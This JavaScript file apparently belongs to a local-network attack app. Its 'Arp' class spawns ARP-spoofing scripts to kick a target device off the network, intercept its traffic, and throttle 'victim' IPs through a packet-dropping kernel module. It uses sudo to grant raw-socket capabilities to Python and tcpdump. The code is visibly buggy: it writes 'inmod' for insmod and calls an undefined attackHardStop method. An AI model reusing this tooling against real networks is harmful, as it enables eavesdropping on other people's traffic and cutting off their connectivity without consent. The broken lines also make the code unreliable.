const { spawn, exec } = require("child_process");
const sudo = require("sudo-prompt");

class Arp {
  privIP;
  gateIP;
  processList;
  pyVersion;
  tcpdumpLocation;

  constructor(privateIP, gatewayIP) {
    this.privIP = privateIP;
    this.gateIP = gatewayIP;
    this.getPythonVersion();
    this.getTcpdumpLocation();
    this.processList = [];
  }

  kickoutStart(targetIP, gatewayMAC) {
    // setup extra requred permissions for linux, they will be unsed at attackHardStop
    if (process.platform === "linux") {
      const options = {
        name: "DoNotEnter",
      };
      sudo.exec(
        "setcap cap_net_raw=eip /usr/bin/python" +
          this.pyVersion +
          " && setcap cap_net_raw=eip " +
          this.tcpdumpLocation,
        options,
        (error, _stdout, _stderr) => {
          if (error) {
            console.log(error);
          } else {
            const cmdPath = "./src/services/kickout.py";
            const proc = spawn(
              "python3",
              [cmdPath, this.gateIP, targetIP, gatewayMAC, "_targetMAC", "0"],
              { detached: true }
            );
            proc.on("error", (err) => {
              console.log("INFO:" + err);
            });
            console.log("INFP: spawn process " + proc.pid);
            this.processList.push(proc.pid);
          }
        }
      );
    } else {
      const cmdPath = "./src/services/kickout.py";
      const proc = spawn(
        "python3",
        [cmdPath, this.gateIP, targetIP, gatewayMAC, "_targetMAC", "0"],
        { detached: true }
      );
      proc.on("error", (err) => {
        console.log("INFO:" + err);
      });
      console.log("INFP: spawn process " + proc.pid);
      this.processList.push(proc.pid);
    }
  }

  kickoutStop(targetIP, gatewayMAC, targetMAC) {
    this.attackHardStop();
    const cmdPath = "./src/services/kickout.py";
    const proc = spawn(
      "python3",
      [cmdPath, this.gateIP, targetIP, gatewayMAC, targetMAC, "1"],
      { detached: true }
    );
    proc.on("error", (err) => {
      console.log(err);
    });
    console.log("Process " + proc.pid + "spawned");
    this.processList.push(proc.pid);
  }

  /**
   * Some routers will block ARP packet when the sender IP address is the same as the router.
   * This method is a walk around of this issue, when this method is called, user can only see
   * the packets send to the target, but not packets send by the target.
   * @param {string} targetIP
   * @param {string} gatewayMAC
   */
  spyLimitedStart(targetIP, gatewayMAC) {
    this.kickoutStart(targetIP, gatewayMAC);
  }

  spyStart(targetIP, targetMAC, gatewayMAC) {
    const cmdPath = "./src/services/spy.py";
    const proc = spawn(
      "python3",
      [cmdPath, this.gateIP, targetIP, gatewayMAC, targetMAC, "0"],
      { detached: true }
    );
    proc.on("error", (err) => {
      console.log(err);
    });
    console.log("Process " + proc.pid + "spawned");
    this.processList.push(proc.pid);
  }

  speedLimitStart(percent, victimIPs, limited) {
    if (process.platform === "linux") {
      const modulePath = "./kernelModule/netfilter_drop_packet.ko";
      const cmd =
        "inmod " +
        modulePath +
        " percent=" +
        percent +
        " victimIP=" +
        victimIPs;
      const options = {
        name: "DoNotEnter",
      };
      console.log("INFO: insert module command is: " + cmd);
      // insert the kernel module
      sudo.exec(cmd, options, (error, _stdout, _stderr) => {
        if (error) {
          console.log(error);
        }
      });
    }
  }

  speedLimitStop() {
    const options = {
      name: "DoNotEnter",
    };
    if (process.platform === "linux") {
      sudo.exec(
        "rmmod netfilter_drop_packet",
        options,
        (error, _stdout, _stderr) => {
          if (error) {
            console.log(error);
          }
        }
      );
    }
  }

  killAttackProcesses() {
    if (process.platform === "linux") {
      const options = {
        name: "DoNotEnter",
      };
      sudo.exec(
        "setcap cap_net_raw=-eip /usr/bin/python" +
          this.pyVersion +
          " && setcap cap_net_raw=-eip " +
          this.tcpdumpLocation,
        options,
        (error, _stdout, _stderr) => {
          if (error) {
            console.log(error);
          }
        }
      );
    }
    for (let i = 0; i < this.processList.length; i++) {
      console.log(
        "INFO: stopping attack by killing process " + this.processList[i]
      );
      process.kill(this.processList[i]);
    }
    this.processList = [];
  }

  /**
   * Helper function, check which version of python is installed
   */
  getPythonVersion() {
    exec("python3 --version", (error, stdout, stderr) => {
      if (error) {
        console.log(stderr);
      }
      this.pyVersion = stdout.match(/[0-9].[0-9]/g)[0];
      console.log("INFO: python version is " + this.pyVersion);
    });
  }

  /**
   * Helper function, get tcpdump location
   */
  getTcpdumpLocation() {
    exec("which tcpdump", (error, stdout, stderr) => {
      if (error) {
        console.log(stderr);
      }
      this.tcpdumpLocation = stdout;
      console.log("INFO: tcpdump at " + this.tcpdumpLocation);
    });
  }
}

module.exports = Arp;
